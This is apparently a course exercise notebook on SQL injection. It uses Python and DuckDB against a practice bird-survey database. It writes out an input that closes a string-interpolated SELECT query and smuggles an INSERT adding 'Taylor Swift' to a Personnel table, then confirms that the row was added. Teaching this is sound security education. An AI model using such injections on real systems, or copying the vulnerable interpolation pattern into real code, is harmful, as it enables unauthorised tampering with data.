-- Hack your bird database! Let’s imagine that your Shiny application, in response to user input, executes the query

-- SELECT * FROM Species WHERE Code = '%s';
-- where a species code (supplied by the application user) is directly substituted for the query’s %s using Python interpolation. For example, an innocent user might input “wolv”. Craft an input that a devious user could use to:

-- Add Taylor Swift to the Personnel table
-- Yet still return the results of the query SELECT * FROM Species WHERE Code = 'wolv' (devious!)

```python
conn = duckdb.connect("../database.duckdb")
```

```python
# get initial personnel count
personnel = conn.execute("SELECT * FROM Personnel").df()
print(f'Personnel has {personnel.shape[0]} rows.')
```

```python
# craft query to be executed, filled in by user input with python string interpolation
query = "SELECT * FROM Species WHERE Code = '%s'"

# craft devious sql insertion
devious_input = "wolv'; INSERT INTO Personnel (Abbreviation, Name) VALUES ('tswift', 'Taylor Swift');--"

# confirm output
print(query % (devious_input))
```

```python
# execute query with input
conn.execute(query % devious_input)
```

```python
# confirm insertion into Personnel
conn.execute("SELECT * FROM Personnel WHERE Abbreviation = 'tswift'").fetchall()
```

```python
personnel_ts = conn.execute("SELECT * FROM Personnel").df()
print(f'Personnel has {personnel_ts.shape[0]} rows.')
```
